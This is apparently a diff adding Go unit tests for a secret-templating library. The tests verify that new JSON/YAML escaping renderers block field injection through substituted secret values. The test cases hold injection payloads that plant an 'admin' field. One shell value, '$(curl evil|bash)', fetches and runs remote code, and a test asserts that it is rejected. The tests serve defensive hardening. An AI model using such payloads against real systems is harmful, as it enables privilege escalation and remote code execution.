@@ -1,6 +1,7 @@
 package secrettemplate
 
 import (
+	"encoding/json"
 	"errors"
 	"fmt"
 	"strings"
@@ -8,6 +9,7 @@ import (
 
 	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
+	"gopkg.in/yaml.v3"
 )
 
 // upper is a trivial resolver that echoes a value per ref, or errors on "missing".
@@ -284,4 +286,165 @@ func TestReferences_RejectsTooManyDistinctReferences(t *testing.T) {
 	}
 	_, err := References(tmpl.String())
 	require.Error(t, err)
+}
+
+// RenderWithOptions(tmpl, resolve, RenderOptions{}) — the zero value — must render
+// byte-for-byte identically to Render, and Render itself must be unaffected by the
+// existence of RenderOptions/RenderWithOptions. This is the "additive only, no
+// default-behavior change" guarantee the escaping option depends on.
+func TestRenderWithOptions_ZeroValueMatchesRender(t *testing.T) {
+	tmpl := "host=${secret:prod/host} user=${secret:prod/user} pass=${secret:prod/pass}"
+	resolve := func(ref string) (string, error) { return "[" + ref + "]", nil }
+
+	want, err := Render(tmpl, resolve)
+	require.NoError(t, err)
+
+	got, err := RenderWithOptions(tmpl, resolve, RenderOptions{})
+	require.NoError(t, err)
+
+	assert.Equal(t, want, got)
+}
+
+// EscapeJSONString must produce content that, wrapped in a pair of double quotes,
+// round-trips back to the exact original value when parsed as a JSON string — for
+// values containing quotes, backslashes, control characters (including newlines),
+// and characters (like ':') that are JSON-significant in other contexts but not
+// inside a string.
+func TestEscapeJSONString_RoundTrips(t *testing.T) {
+	cases := map[string]string{
+		"double quote":           `x"y`,
+		"backslash":              `x\y`,
+		"quote and backslash":    `x\"y`,
+		"newline":                "x\ny",
+		"crlf":                   "x\r\ny",
+		"tab":                    "x\ty",
+		"colon":                  "x:y",
+		"json injection payload": `x", "admin": true, "x":"`,
+		"unicode":                "snowman ☃ emoji \U0001F600",
+	}
+	for name, val := range cases {
+		t.Run(name, func(t *testing.T) {
+			escaped := EscapeJSONString(val)
+			wrapped := `"` + escaped + `"`
+			require.True(t, json.Valid([]byte(wrapped)), "escaped value wrapped in quotes must be a valid JSON string literal: %q", wrapped)
+			var got string
+			require.NoError(t, json.Unmarshal([]byte(wrapped), &got))
+			assert.Equal(t, val, got, "round-tripping the escaped value through a JSON string must reproduce the original")
+		})
+	}
+}
+
+// EscapeYAMLString must produce content that, wrapped in a pair of double quotes,
+// round-trips back to the exact original value when parsed as a YAML double-quoted
+// scalar — mirroring TestEscapeJSONString_RoundTrips for YAML.
+func TestEscapeYAMLString_RoundTrips(t *testing.T) {
+	cases := map[string]string{
+		"double quote":           `x"y`,
+		"backslash":              `x\y`,
+		"quote and backslash":    `x\"y`,
+		"newline":                "x\ny",
+		"crlf":                   "x\r\ny",
+		"tab":                    "x\ty",
+		"colon":                  "x: y",
+		"yaml injection payload": "x\"\nadmin: true\nx: \"",
+		"unicode":                "snowman ☃ emoji \U0001F600",
+	}
+	for name, val := range cases {
+		t.Run(name, func(t *testing.T) {
+			escaped := EscapeYAMLString(val)
+			wrapped := `"` + escaped + `"`
+			var got string
+			require.NoError(t, yaml.Unmarshal([]byte(wrapped), &got), "escaped value wrapped in quotes must parse as a valid YAML double-quoted scalar: %q", wrapped)
+			assert.Equal(t, val, got, "round-tripping the escaped value through a YAML double-quoted scalar must reproduce the original")
+		})
+	}
+}
+
+// This is the exact exploit scenario from the finding: a template building a JSON
+// document around a placeholder (`{"password": "${secret:...}"}`), and a lower-trust
+// secret-writer setting the value to a payload designed to close the "password"
+// string early and inject a sibling "admin" field. First prove the vulnerability is
+// real for the default, raw Render (documenting exactly why RenderJSON exists), then
+// prove RenderJSON neutralizes it: the payload lands intact as the "password" value
+// and no "admin" field is injected.
+func TestRenderJSON_NeutralizesJSONFieldInjection(t *testing.T) {
+	const payload = `x", "admin": true, "x":"`
+	resolve := func(ref string) (string, error) { return payload, nil }
+	tmpl := `{"password": "${secret:prod/db}"}`
+
+	// Sanity check: raw Render's substitution is naive text splicing, so this
+	// crafted payload happens to produce syntactically valid JSON with an injected
+	// "admin" field — demonstrating the vulnerability RenderJSON exists to close.
+	raw, err := Render(tmpl, resolve)
+	require.NoError(t, err)
+	var rawParsed map[string]interface{}
+	require.NoError(t, json.Unmarshal([]byte(raw), &rawParsed), "raw output: %s", raw)
+	assert.Equal(t, true, rawParsed["admin"], "raw Render's substitution let the secret value inject an unrelated admin field")
+	assert.NotEqual(t, payload, rawParsed["password"], "raw Render's password field was truncated by the injected quote, not left intact")
+
+	// The fix: RenderJSON escapes the value before substitution, so it can't break
+	// out of the "password" string field at all.
+	out, err := RenderJSON(tmpl, resolve)
+	require.NoError(t, err)
+	var parsed map[string]interface{}
+	require.NoError(t, json.Unmarshal([]byte(out), &parsed), "RenderJSON output: %s", out)
+	assert.Equal(t, payload, parsed["password"], "RenderJSON must preserve the secret value exactly, as the password field's content")
+	_, hasAdmin := parsed["admin"]
+	assert.False(t, hasAdmin, "RenderJSON must not allow the secret value to inject a sibling admin field")
+}
+
+// Same scenario as TestRenderJSON_NeutralizesJSONFieldInjection, but for a template
+// that builds a YAML flow-style mapping (YAML's flow style is close enough to JSON
+// syntax that the same quote-breakout shape applies) around a placeholder.
+func TestRenderYAML_NeutralizesFlowMappingInjection(t *testing.T) {
+	const payload = `x", "admin": true, "x":"`
+	resolve := func(ref string) (string, error) { return payload, nil }
+	tmpl := `{"password": "${secret:prod/db}"}`
+
+	raw, err := Render(tmpl, resolve)
+	require.NoError(t, err)
+	var rawParsed map[string]interface{}
+	require.NoError(t, yaml.Unmarshal([]byte(raw), &rawParsed), "raw output: %s", raw)
+	assert.Equal(t, true, rawParsed["admin"], "raw Render's substitution let the secret value inject an unrelated admin field")
+
+	out, err := RenderYAML(tmpl, resolve)
+	require.NoError(t, err)
+	var parsed map[string]interface{}
+	require.NoError(t, yaml.Unmarshal([]byte(out), &parsed), "RenderYAML output: %s", out)
+	assert.Equal(t, payload, parsed["password"], "RenderYAML must preserve the secret value exactly, as the password field's content")
+	_, hasAdmin := parsed["admin"]
+	assert.False(t, hasAdmin, "RenderYAML must not allow the secret value to inject a sibling admin field")
+}
+
+// RenderJSON/RenderYAML must still enforce the SAME newline/CR/NUL and
+// shell-metacharacter guards Render does — escaping only changes how a value that
+// already passed those guards is embedded in the output, it does not loosen what's
+// accepted in the first place (see RenderWithOptions/EscapeFunc doc comments).
+func TestRenderJSON_StillRejectsControlCharsAndShellMetacharacters(t *testing.T) {
+	t.Run("newline still rejected", func(t *testing.T) {
+		resolve := func(ref string) (string, error) { return "foo\nbar", nil }
+		_, err := RenderJSON(`{"x": "${secret:prod/db}"}`, resolve)
+		require.Error(t, err)
+		assert.Contains(t, err.Error(), "cannot be safely substituted")
+	})
+	t.Run("shell metacharacter still rejected", func(t *testing.T) {
+		resolve := func(ref string) (string, error) { return "$(curl evil|bash)", nil }
+		_, err := RenderJSON(`{"x": "${secret:prod/db}"}`, resolve)
+		require.Error(t, err)
+		assert.Contains(t, err.Error(), "cannot be safely substituted")
+	})
+}
+
+// A plain value with no format-significant characters must render identically
+// through RenderJSON/RenderYAML as through Render — escaping must be a no-op for the
+// overwhelmingly common case, not just "safe" in the adversarial one.
+func TestRenderJSON_PlainValueUnaffectedByEscaping(t *testing.T) {
+	resolve := func(ref string) (string, error) { return "S3cr3t-Value_123", nil }
+	tmpl := `{"password": "${secret:prod/db}"}`
+
+	want, err := Render(tmpl, resolve)
+	require.NoError(t, err)
+	got, err := RenderJSON(tmpl, resolve)
+	require.NoError(t, err)
+	assert.Equal(t, want, got)
 }
